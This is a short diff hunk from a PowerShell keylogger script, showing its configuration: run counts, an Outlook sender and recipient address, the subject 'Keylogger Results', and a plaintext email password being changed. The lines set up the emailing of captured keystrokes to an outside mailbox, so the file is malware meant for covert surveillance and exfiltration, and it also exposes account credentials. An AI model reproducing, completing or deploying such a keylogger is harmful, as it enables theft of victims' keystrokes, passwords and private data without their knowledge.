@@ -2,7 +2,7 @@
 $TimesToRun = 2
 $RunTimeP = 60
 $From = "erlend07@outlook.com"
-$Pass = "CxZmNbV1"
+$Pass = "loluthought"
 $To = "erlend07@outlook.com"
 $Subject = "Keylogger Results"
 $body = "Keylogger Results"
